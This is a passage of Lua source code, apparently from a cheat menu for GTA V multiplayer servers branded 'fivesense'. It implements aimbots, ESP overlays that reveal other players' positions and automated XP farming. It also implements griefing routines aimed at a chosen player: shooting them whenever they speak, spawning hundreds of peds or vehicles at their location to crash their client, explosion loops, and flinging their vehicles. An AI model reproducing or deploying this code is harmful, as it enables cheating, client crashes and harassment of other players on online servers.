           if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
               sum.f.requestControlOnce(ped)
               if sum.f.IsEntityOnScreen(ped) then
                   local bones = {
                       0,
                       23553,
                       24817,
                       24818,
                       24816,
                       11816,
                       31086,
                       0xcc4d,
                       0x9995,
                       0x3779,
                       0xE0FD,
                       0x5C57,
                       0x192A,
                       0x9995,
                       0xB1C5,
                       0xEEEB,
                       0x49D9,
                       0x9D4D,
                       0x6E5C,
                       0xDEAD,
                       0x5c01
                   }
                   local typebones = (bones[math.random(#bones)])
                   local _, gun = sum.f.GetCurrentPedWeapon(sum.f.PlayerPedId())
                   local b = sum.f.GetEntityRotation(ped)
                   local c = sum.f.rotationToDirection(b)
                   local d = sum.f.GetEntityCoords(sum.f.PlayerPedId())
                   local e = sum.f.GetEntityCoords(ped, true)
                   local f = sum.f.GetPedBoneCoords(ped, typebones, 0, 0, 0)
                   local g = sum.f.GetDistanceBetweenCoords(d.x, d.y, d.z, e.x, e.y, e.z, false)
                   local p = sum.f.PlayerPedId()
                   if g <= sum.s['glife-xpfarm-distance'].value then
                       local dead = sum.f.IsEntityDead(ped)
                       if not dead then
                           sum.f.ResetPedVisibleDamage(ped)
                               sum.f.ClearPedBloodDamage(ped)
                               sum.f.ShootSingleBulletBetweenCoords( f.x + c.x, f.y + c.y, f.z + c.z, f.x, f.y, f.z, 0.1, false, gun, sum.f.PlayerPedId(), false, true, 0.1 )
                               --sum.f.SetPedAmmo(p, gun, 1)--sum.f.RefillAmmoInstantly(p, true)--sum.f.SetPedInfiniteAmmoClip(p, true)-- SetPedShootsAtCoord(p, e, false)
                           end
                       end
                       if sum.f.IsEntityDead(ped) then 
                           sum.f.SetEntityVisible(ped, false, false)
                       end
                   end
               end
           end
       end
   
       if sum.c['auto-storeveh'] then
           if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId()) then 
               sum.f.KeySimulation(0x4B, 50)
           end
       end
   
       if sum.c['auto-lootzombies'] then
           for ped in sum.f.enumeratePeds() do
               if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   if sum.f.IsEntityDead(ped) then 
                       sum.f.KeySimulation(0x45, 50)
                   end
               end
           end
       end
   
   
   
   if sum.c['visuals-blips'] then
       for k, v in pairs(sum.f.GetActivePlayers()) do
           local ped = sum.f.GetPlayerPed(v)
           if ped ~= sum.f.PlayerPedId() then
               local playerblip = sum.f.GetBlipFromEntity(ped)
   
               if not sum.f.DoesBlipExist(playerblip) then
                   playerblip = sum.f.AddBlipForEntity(ped)
                   sum.f.SetBlipSprite(playerblip, 126)
                   sum.f.ShowHeadingIndicatorOnBlip(playerblip, true)
                   sum.f.SetBlipNameToPlayerName(playerblip, v)
                   sum.f.SetBlipScale(playerblip, 0.80)
                   sum.f.SetBlipColour(playerblip, 49)
               else
                   local vehicle = sum.f.GetVehiclePedIsIn(ped, false)
                   local blipshit = sum.f.GetBlipSprite(playerblip)
                   local model = sum.f.GetEntityModel(vehicle)
                   if sum.f.GetEntityHealth(ped) == 0 then
                       if blipshit ~= 429 then
                           sum.f.SetBlipSprite(playerblip, 429)
                           sum.f.SetBlipColour(playerblip, 37)
                           sum.f.ShowHeadingIndicatorOnBlip(playerblip, true)
                           sum.f.SetBlipScale(playerblip, 0.80)
                       end
                   elseif vehicle then
                       local blippd = sum.f.GetBlipSprite(playerblip)
                       local vehiclehash = sum.f.GetVehicleClass(vehicle)
                       if
                           vehiclehash == sum.f.GetHashKey("police") or model == sum.f.GetHashKey("police2") or
                               model == sum.f.GetHashKey("police3") or
                               model == sum.f.GetHashKey("sheriff2") or
                               model == sum.f.GetHashKey("sheriff") or
                               model == sum.f.GetHashKey("policeold2") or
                               model == sum.f.GetHashKey("fbi") or
                               model == sum.f.GetHashKey("fbi2")
                       then
                           if blippd ~= 60 then
                               sum.f.SetBlipSprite(playerblip, 60)
                               sum.f.SetBlipColour(playerblip, 26)
                               sum.f.SetBlipScale(playerblip, 0.80)
                               sum.f.ShowHeadingIndicatorOnBlip(playerblip, true)
                           end
   
                           if sum.f.IsPauseMenuActive() then
                               sum.f.SetBlipAlpha(playerblip, 255)
                           else
                               local x1, y1 = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), true))
                               local x2, y2 = table.unpack(sum.f.GetEntityCoords(sum.f.GetPlayerPed(v), true))
                               local distance = (sum.curak.floor(sum.curak.abs(sum.curak.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
   
                               if distance < 0 then
                                   distance = 0
                               elseif distance > 255 then
                                   distance = 255
                               end
                               sum.f.SetBlipAlpha(playerblip, distance)
                               sum.f.SetBlipRotation(playerblip, sum.curak.ceil(sum.f.GetEntityHeading(vehicle)))
                           end
                       end
                   end
               end
           end
       end
       else
           for k, v in pairs(sum.f.GetActivePlayers()) do
               local ped = sum.f.GetPlayerPed(v)
               local playerblip = sum.f.GetBlipFromEntity(ped)
           sum.f.RemoveBlip(playerblip)
       end    
   end
   
       if sum.c['speak2-sucker'] then
           if sum.f.NetworkIsPlayerTalking(sel.selectedPlayer) then
               local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
               local bones = {0, 23553, 24817, 24818, 24816, 11816,31086, 0xcc4d, 0x9995, 0x3779, 0xE0FD,0x5C57,0x192A,0x9995,0xB1C5,0xEEEB,0x49D9,0x9D4D,0x6E5C,0xDEAD, 0x5c01}
               local typebones = (bones[math.random(#bones)])
               local p = sum.f.GetPlayerPed(sel.selectedPlayer)
               local b = sum.f.GetEntityRotation(p)
               local c = sum.f.rotationToDirection(b)
               local d = sum.f.GetEntityCoords(sum.f.PlayerPedId(), false)
               local e = sum.f.GetEntityCoords(p, false)
               local f = sum.f.GetPedBoneCoords(p, typebones, 0, 0, 0)
               local g = sum.f.GetDistanceBetweenCoords(d.x, d.y, d.z, e.x, e.y, e.z, false)
               if g <= 5000.0 then
                   local h = sum.f.IsEntityDead(p)
                   if not h then
                   sum.f.ShootSingleBulletBetweenCoords(f.x + c.x, f.y + c.y, f.z + c.z, f.x, f.y, f.z, 0.5, false, sum.f.GetHashKey('WEAPON_HEAVYSNIPER'), sum.f.PlayerPedId(), false, true, 1)
               end
           end
       end	
   end
   
       if sum.c['speak3-sucker'] then
           if sum.f.NetworkIsPlayerTalking(sel.selectedPlayer) then
               local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
               local bones = {0, 23553, 24817, 24818, 24816, 11816,31086, 0xcc4d, 0x9995, 0x3779, 0xE0FD,0x5C57,0x192A,0x9995,0xB1C5,0xEEEB,0x49D9,0x9D4D,0x6E5C,0xDEAD, 0x5c01}
               local typebones = (bones[math.random(#bones)])
               local p = sum.f.GetPlayerPed(sel.selectedPlayer)
               local b = sum.f.GetEntityRotation(p)
               local c = sum.f.rotationToDirection(b)
               local d = sum.f.GetEntityCoords(sum.f.PlayerPedId(), false)
               local e = sum.f.GetEntityCoords(p, false)
               local f = sum.f.GetPedBoneCoords(p, typebones, 0, 0, 0)
               local g = sum.f.GetDistanceBetweenCoords(d.x, d.y, d.z, e.x, e.y, e.z, false)
               if g <= 5000.0 then
                   local h = sum.f.IsEntityDead(p)
                   if not h then
                   sum.f.ShootSingleBulletBetweenCoords(f.x + c.x, f.y + c.y, f.z + c.z, f.x, f.y, f.z, 0.5, false, sum.f.GetHashKey('WEAPON_STUNGUN'), sum.f.PlayerPedId(), false, true, 1)
               end
           end
       end	
   end
   
   
       if sum.c['crash-sucker'] then
           local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
           local CrashingPeds = {
               "a_m_m_acult_01",
               "a_m_m_hasjew_01",
               "a_m_m_hillbilly_01",
               "a_m_m_tranvest_01",
               "a_m_y_acult_02",
               "mp_m_fibsec_01",
               "mp_m_bogdangoon",
               "mp_m_meth_01",
           }
           local crashpeds = (CrashingPeds[sum.curak.random(#CrashingPeds)])
           if not sum.f.HasModelLoaded(sum.f.GetHashKey(crashpeds)) then 
               sum.f.RequestModel(sum.f.GetHashKey(crashpeds))
           end 
           for i = 1, 5 do 
               sum.f.CreatePed(3, sum.f.GetHashKey(crashpeds), coord, 1, 1, 1)
               
           end
       end
   
       if sum.c["focusveh"] then
           local ret, entity = sum.f.GetEntityPlayerIsFreeAimingAt(sum.f.PlayerId())
           local isitcar = sum.f.IsEntityAVehicle(entity)
           if ret and isitcar then
               sum.f.SetPedIntoVehicle(sum.f.PlayerPedId(), entity, -1)
           end
       end
       
   
           if sum.c['fuckhispc-sucker'] then
               local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
   
               local rabittlol = "a_c_rabbit_01"
               if not sum.f.HasModelLoaded(sum.f.GetHashKey(rabittlol)) then 
                   sum.f.RequestModel(sum.f.GetHashKey(rabittlol))
               end 
               for i = 1, 400 do 
                   sum.f.CreatePed(21, sum.f.GetHashKey(rabittlol), coord, 1, 1, 1)
               end
           end
       
       if sum.c['trash-sucker'] then
           local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
   
           local thiswilldothings = {"a_c_rabbit_01","a_c_rat","a_c_westy","a_c_stingray","a_c_pug","a_c_poodle","a_c_hen","a_c_cormorant","a_c_pig","a_c_dolphin","a_c_deer","a_c_crow","a_c_boar","a_c_cat_01","a_c_chickenhawk","a_c_chimp","a_c_cow",}
           local objectshits = {"apa_mp_h_stn_chairarm_02","apa_mp_h_stn_chairarm_03","apa_mp_h_kit_kitchen_01_a","apa_mp_h_str_avunitm_01","apa_prop_flag_czechrep","bkr_prop_bkr_cashpile_07","bkr_prop_meth_chiller_01a","bkr_prop_prtmachine_dryer_spin",}
           
           local haha2 = (objectshits[sum.curak.random(#objectshits)])
           if not sum.f.HasModelLoaded(sum.f.GetHashKey(haha2)) then 
               sum.f.RequestModel(sum.f.GetHashKey(haha2))
           end 
   
           local haha = (thiswilldothings[sum.curak.random(#thiswilldothings)])
           if not sum.f.HasModelLoaded(sum.f.GetHashKey(haha)) then 
               sum.f.RequestModel(sum.f.GetHashKey(haha))
           end 
           for i = 1, 5 do 
               sum.f.CreatePed(21, sum.f.GetHashKey(haha), coord, 1, 1, 1)
               sum.f.CreateObject(sum.f.GetHashKey(haha2), coord, true, true, true)
           end
       end
   
       if sum.c['cars-sucker'] then
           local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
           local MassCars = {"sultanrs","blista","zentorno","adder","turismo","deviant","thrax","vamos",}
           local CrashCar = (MassCars[math.random(#MassCars)])
           if not sum.f.HasModelLoaded(sum.f.GetHashKey(CrashCar)) then 
               sum.f.RequestModel(sum.f.GetHashKey(CrashCar))
           end 
           for v = 1, 2 do 
               local veh = sum.f.CreateVehicle(sum.f.GetHashKey(CrashCar), coord, 1, 1, 1)
               sum.f.SetVehicleNumberPlateText(veh, "fivesens")
           end
       end
   
       if sum.c['flame'] then
           local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
           sum.f.RequestNamedPtfxAsset("scr_ba_bomb")
           sum.f.UseParticleFxAssetNextCall("scr_ba_bomb")
           sum.f.StartNetworkedParticleFxNonLoopedAtCoord("scr_ba_bomb_destroy",coord.x,coord.y,coord.z,0.0,0.0,0.0,sum.s['flame-scale'].value,false,false,false)
       end
   
           
       if sum.c['muzparticle'] then
           local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
           sum.f.RequestNamedPtfxAsset("scr_rcbarry2")
           sum.f.UseParticleFxAssetNextCall("scr_rcbarry2")
           sum.f.StartNetworkedParticleFxNonLoopedAtCoord("muz_clown",coord.x,coord.y,coord.z,0.0,0.0,0.0,sum.s['muz-scale'].value,false,false,false)
       end
   
   
           if sum.c['sucker-animplate'] then
               if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
               local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
               sum.f.requestControlOnce(veh)
               sum.curak.thr(function()
                   sum.f.SetVehicleNumberPlateText(veh, "FIVESENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "IVESENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "VESENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "ESENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "SENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "ENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "NSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "SE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "E")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "E")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "SE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "NSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "ENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "SENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "ESENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "VESENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "IVESENSE")
                   sum.curak.wait(250)
                   sum.f.SetVehicleNumberPlateText(veh, "FIVESENSE")	
               end)
           end
       end
   
           for k, v in sum.curak.ipairs(sum.checkboxes) do 
               if sum.f.IsDisabledControlJustPressed(0, sum.keys[v.val]) then 
                   if sum.c[tostring(v.t)] then 
                       sum.c[tostring(v.t)] = false
                   elseif not sum.c[tostring(v.t)] then 
                       sum.c[tostring(v.t)] = true
                   end
               end
           end
       
           if sum.c['sucker-launch'] then
               if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, 0.0, 0.0, 10.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           if sum.c['sucker-explode-loop'] then
               if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
                       local position = sum.f.GetEntityCoords(veh)
                       sum.curak.thr(function()
                       sum.curak.wait(150)
                       sum.f.AddExplosion(position, 7, 100.0, true, false, 1.0)
                   end)
               end
           end
   
           if sum.c['sucker-slam'] then
               if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           if sum.c['sucker-stick'] then
               if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           if sum.c['sucker-fastasfuck'] then
               if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
               local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
               sum.f.requestControlOnce(veh)
               sum.f.ApplyForceToEntity(veh, 3, 1.0, 0.0, 0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
           end
       end
   
           if sum.c['sucker-bringveh'] then
                for veh in sum.f.enumerateVehicles() do
                   local ped = sum.f.PlayerPedId()
                   local coords = sum.f.GetEntityCoords(ped)
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, coords, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
       if sum.c['visuals-vehicle-esp'] then 
           for vehicle in sum.f.enumerateVehicles() do
               local x, y, z = table.unpack(sum.f.GetEntityCoords(vehicle))
               local _, _x, _y = sum.f.GetScreenCoordFromWorldCoord(x, y, z)   
               local x1, y1, z1 = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId()))
               local dist = tonumber(sum.curak.format("%.1f", sum.f.GetDistanceBetweenCoords(x1, y1, z1, x, y, z, true)))
               local string = ''.. sum.f.GetDisplayNameFromVehicleModel(sum.f.GetEntityModel(vehicle)).. ' ('.. dist.. 'm)' 
              --[[ if _x > 0.9 then _x = 0.9 end
               if _y > 0.9 then _y = 0.9 end
               if _x < 0.1 then _x = 0.1 end
               if _y < 0.1 then _y = 0.1 end
               if _x == 0.1 and _y == 0.1 then 
                   string = ''
               end]]
               if dist < sum.s['visuals-distance'].value then
                   sum.f.drawTextOutline(string, _x, _y, 0.23, 4, true, true, sum.s['visuals-vehicle-r'].value, sum.s['visuals-vehicle-g'].value, sum.s['visuals-vehicle-b'].value)
               end
           end
       end
   
       if sum.c['sucker-fuckveh'] then
           if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
               local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
               local ped = sum.f.PlayerPedId()
               local coords = sum.f.GetEntityCoords(ped)
               sum.f.requestControlOnce(veh)
               sum.f.ApplyForceToEntity(veh, 3, coords, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
           end
       end
   
   
   
   
           if sum.c['car-riptire'] then
               for veh in sum.f.enumerateVehicles() do
                   sum.f.SetVehicleTyreBurst(veh, 0, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 1, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 2, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 3, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 5, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 7, true, 1000.0)
               end
           end
           
           if sum.c['car-launch'] then
               for veh in sum.f.enumerateVehicles() do
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, 0.0, 0.0, 10.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           if sum.c['car-stick'] then
               for veh in sum.f.enumerateVehicles() do
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           if sum.c['car-fastasfuck'] then
               for veh in sum.f.enumerateVehicles() do
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           if sum.c['car-spam'] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(v))
                   local MassCars = {"sultanrs","blista","zentorno","adder","turismo","deviant","thrax","vamos",}
                   local CrashCar = (MassCars[sum.curak.random(#MassCars)])
                   if not sum.f.HasModelLoaded(sum.f.GetHashKey(CrashCar)) then 
                       sum.f.RequestModel(sum.f.GetHashKey(CrashCar))
                   end 
                   for v = 1, 5 do 
                       local veh = sum.f.CreateVehicle(sum.f.GetHashKey(CrashCar), coord, 1, 1, 1)
                       sum.f.SetVehicleNumberPlateText(veh, "fivesens")
                   end
               end
           end
   
   
           if sum.c['car-slam'] then
               for veh in sum.f.enumerateVehicles() do
                   sum.f.requestControlOnce(veh)
                   sum.f.ApplyForceToEntity(veh, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
   
           if sum.c['slam-peds'] then
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   sum.f.ApplyForceToEntity(ped, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
       end
   
               if sum.c['slam-peds'] then
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   sum.f.ApplyForceToEntity(ped, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
       end
   
           if sum.c['launch-peds'] then
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   sum.f.ApplyForceToEntity(ped, 3, 0.0, 0.0, 10.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
       end
   
           if sum.c['peds-explode-loop'] then
               for ped in sum.f.enumeratePeds() do
                   if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
                   local position = sum.f.GetEntityCoords(ped)
                   sum.curak.thr(function()
                   sum.curak.wait(250)
                   sum.f.AddExplosion(position, 7, 100.0, true, false, 1.0)
               end)
           end
       end
   end
   
       if sum.c['drawfsmarker'] then
           sum.f.drawTextOutline('</font> five<font color="#70D900">sense</font> | FPS: '.. sum.curak.floor(1.0 / sum.f.GetFrameTime()), 0.0, 0.012, 0.25, 4, true, false, 255, 255, 255)
       end
       if sum.c['drawdick'] then
           local dickshit = sum.f.GetServerInformation()
           sum.f.drawTextOutline('\85\73\68\58 <font color="#70D900">'..dickshit, 0.001, 0.025, 0.25, 4, true, false, 255, 255, 255)
       end
   
       if sum.c['weapons-aimbot'] then
           for C in sum.f.enumeratePeds() do
               if sum.combo[25] == 1 then
                   otherpos = sum.f.GetPedBoneCoords(C, 31086, 0.0, 0.0, 0.0)
               elseif sum.combo[25] == 2 then
                   otherpos = sum.f.GetPedBoneCoords(C, 39317, 0.0, 0.0, 0.0)
               elseif sum.combo[25] == 3 then
                   otherpos = sum.f.GetPedBoneCoords(C, 23553, 0.0, 0.0, 0.0)
               elseif sum.combo[25] == 4 then
                   otherpos = sum.f.GetPedBoneCoords(C, 24818, 0.0, 0.0, 0.0)
               elseif sum.combo[25] == 5 then
                   otherpos = sum.f.GetPedBoneCoords(C, 11816, 0.0, 0.0, 0.0)
               end
               if sum.c['weapons-aimbot-peds'] then 
                   R = C
               else
                   R = sum.f.IsPedAPlayer(C)
               end
                                           
               local x, y, z = table.unpack(sum.f.GetEntityCoords(C))
               local _, _x, _y = sum.f.GetScreenCoordFromWorldCoord(x, y, z)
               local x1, y1, z1 = table.unpack(otherpos)
               local FOV = sum.s['weapons-aimbot-fov'].value
               if C ~= sum.f.PlayerPedId() and sum.f.IsEntityOnScreen(C) and R then
                       if (_x > 0.5 - FOV / 2 and _x < 0.5 + FOV / 2 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                           if sum.f.IsAimCamActive() and sum.f.IsPedShooting(sum.f.PlayerPedId()) then
                               if sum.c['weapons-aimbot-vischeck'] then 
                                   if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), C, 19) then 
                                       if sum.c['weapons-aimbot-deads'] then 
                                           if sum.f.IsEntityDead(C) then 
                                               sum.f.ShootSingleBulletBetweenCoords(x1, y1, z1+0.02, x1, y1, z1, 1000.0, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 5000.0)									
                                           else
                                               sum.f.ShootSingleBulletBetweenCoords(x1, y1, z1+0.02, x1, y1, z1, 1000.0, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 5000.0)									
                                           end
                                       else
                                           if sum.f.IsEntityDead(C) then 
                                           else
                                               sum.f.ShootSingleBulletBetweenCoords(x1, y1, z1+0.02, x1, y1, z1, 1000.0, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 5000.0)									
                                           end
                                       end
                                   else
                                   end
                               else
                                   if sum.c['weapons-aimbot-deads'] then 
                                       if sum.f.IsEntityDead(C) then 
                                           sum.f.ShootSingleBulletBetweenCoords(x1, y1, z1+0.02, x1, y1, z1, 1000.0, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 5000.0)					
                                       else
                                           sum.f.ShootSingleBulletBetweenCoords(x1, y1, z1+0.02, x1, y1, z1, 1000.0, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 5000.0)										
                                       end
                                   else
                                       if sum.f.IsEntityDead(C) then 
                                       else
                                           sum.f.ShootSingleBulletBetweenCoords(x1, y1, z1+0.02, x1, y1, z1, 1000.0, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 5000.0)	
                                       end
                                   end
                               end
                           end							
                       end
                   end
               end
           end
   
   
               if sum.c["glife-aimbot"] then
                   for C in sum.f.enumeratePeds() do
                       if sum.combo[25] == 1 then
                           otherpos = sum.f.GetPedBoneCoords(C, 31086, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 2 then
                           otherpos = sum.f.GetPedBoneCoords(C, 39317, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 3 then
                           otherpos = sum.f.GetPedBoneCoords(C, 23553, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 4 then
                           otherpos = sum.f.GetPedBoneCoords(C, 24818, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 5 then
                           otherpos = sum.f.GetPedBoneCoords(C, 11816, 0.0, 0.0, 0.0)
                       end
                       local A = sum.f.IsPedAPlayer(C)
                       local x, y, z = table.unpack(sum.f.GetEntityCoords(C))
                       local _, _x, _y = sum.f.GetScreenCoordFromWorldCoord(x, y, z)
                       local FOV = sum.s["glife-aimbot-fov"].value
                       if C ~= sum.f.PlayerPedId() and sum.f.IsEntityOnScreen(C) and R and A and not sum.f.IsEntityDead(C) then
                           if (_x > 0.5 - FOV / 2 and _x < 0.5 + FOV / 2 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                               if sum.f.IsAimCamActive() and sum.f.IsPedShooting(sum.f.PlayerPedId()) then
                                   if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), C, 19) then
                                       sum.f.SetPedShootsAtCoord(sum.f.PlayerPedId(), otherpos)
                                   end
                                   if sum.c['glife-aimbot-dt'] then
                                       if sum.f.IsAimCamActive() and sum.f.IsPedShooting(sum.f.PlayerPedId()) then
                                           if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), C, 19) then
                                               sum.f.SetPedShootsAtCoord(sum.f.PlayerPedId(), otherpos)
                                               sum.f.SetPedShootsAtCoord(sum.f.PlayerPedId(), otherpos)
                                           end
                                       end
                                   end
                               end
                           end
                       end
                   end
               end
               
               
               if sum.c['glife-aimbot-peds'] then
                   for C in sum.f.enumeratePeds() do
                       if sum.combo[25] == 1 then
                           otherpos = sum.f.GetPedBoneCoords(C, 31086, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 2 then
                           otherpos = sum.f.GetPedBoneCoords(C, 39317, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 3 then
                           otherpos = sum.f.GetPedBoneCoords(C, 23553, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 4 then
                           otherpos = sum.f.GetPedBoneCoords(C, 24818, 0.0, 0.0, 0.0)
                       elseif sum.combo[25] == 5 then
                           otherpos = sum.f.GetPedBoneCoords(C, 11816, 0.0, 0.0, 0.0)
                       end 
                       local x, y, z = table.unpack(sum.f.GetEntityCoords(C))
                       local _, _x, _y = sum.f.GetScreenCoordFromWorldCoord(x, y, z)
                       local FOV = sum.s["glife-aimbot-fov"].value
                       if C ~= sum.f.PlayerPedId() and sum.f.IsEntityOnScreen(C) and not sum.f.IsEntityDead(C) then
                           if (_x > 0.5 - FOV / 2 and _x < 0.5 + FOV / 2 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                               if sum.f.IsAimCamActive() and sum.f.IsPedShooting(sum.f.PlayerPedId()) then
                                   if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), C, 19) then
                                       sum.f.ShootSingleBulletBetweenCoords(x1, y1, z1+0.02, x1, y1, z1, 0.1, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 5000.0)					
                                   end
                               end
                           end
                       end
                   end
               end
   
   
   
           if sum.c['cars-animplate'] then
               for veh in sum.f.enumerateVehicles() do
                   sum.f.requestControlOnce(veh)
                   sum.f.SetVehicleNumberPlateText(veh, "FIVESENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "IVESENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "VESENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "ESENSE")
